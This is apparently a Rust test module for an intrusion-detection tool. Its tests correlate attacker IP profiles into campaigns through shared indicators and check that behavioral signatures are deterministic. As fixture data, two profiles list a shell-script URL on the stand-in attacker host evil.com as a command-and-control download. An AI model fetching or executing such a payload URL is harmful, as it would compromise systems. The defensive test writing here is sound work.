    #[test]
    fn detect_campaigns_by_shared_iocs() {
        let mut profiles = HashMap::new();
        // Two IPs downloading from the same C2 server
        let mut p1 = new_profile("10.0.0.1", Utc::now());
        p1.total_incidents = 2;
        p1.detectors_triggered.insert("port_scan".into());
        p1.iocs.urls.push("http://evil.com/shell.sh".into());

        let mut p2 = new_profile("10.0.0.2", Utc::now());
        p2.total_incidents = 4;
        p2.detectors_triggered.insert("ssh_bruteforce".into());
        p2.iocs.urls.push("http://evil.com/shell.sh".into());

        profiles.insert("10.0.0.1".into(), p1);
        profiles.insert("10.0.0.2".into(), p2);

        let campaigns = detect_campaigns(&profiles);
        assert_eq!(campaigns.len(), 1);
        assert!(campaigns[0].correlation_type.contains("ioc"));
        assert!(!campaigns[0].shared_iocs.is_empty());
    }

    #[test]
    fn no_campaigns_from_unrelated_profiles() {
        let mut profiles = HashMap::new();
        let mut p1 = new_profile("1.1.1.1", Utc::now());
        p1.total_incidents = 1;
        p1.detectors_triggered.insert("ssh_bruteforce".into());

        let mut p2 = new_profile("2.2.2.2", Utc::now());
        p2.total_incidents = 1;
        p2.detectors_triggered.insert("web_scan".into());

        profiles.insert("1.1.1.1".into(), p1);
        profiles.insert("2.2.2.2".into(), p2);

        let campaigns = detect_campaigns(&profiles);
        assert!(campaigns.is_empty());
    }

    #[test]
    fn behavioral_signature_deterministic() {
        let mut p1 = new_profile("1.1.1.1", Utc::now());
        p1.detectors_triggered.insert("ssh_bruteforce".into());
        p1.dna.tool_signatures.push("download".into());

        let mut p2 = p1.clone();
        p2.ip = "2.2.2.2".into(); // different IP, same behavior

        let sig1 = behavioral_signature(&p1);
        let sig2 = behavioral_signature(&p2);
        assert_eq!(sig1, sig2);
    }
}
